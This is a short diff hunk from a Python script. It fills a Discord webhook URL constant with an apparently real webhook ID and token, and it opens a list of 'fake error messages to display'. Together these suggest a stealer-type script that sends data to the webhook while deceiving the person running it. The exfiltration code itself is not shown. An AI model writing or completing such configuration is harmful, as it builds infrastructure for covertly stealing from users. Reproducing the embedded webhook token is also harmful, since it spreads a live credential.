@@ -11,7 +11,7 @@ from pathlib import Path
 
 # --- CONFIGURATION ---
 # Replace with your Discord Webhook URL
-WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1569058469921947698/72LgVtFsCDLYB5s-s0lvh1sbY1TZM4Wdz3hwHqKtAOpbnoKTADWb1dsUf7-Lrahizl5C"
 
 # Fake error messages to display
 ERROR_MESSAGES = [
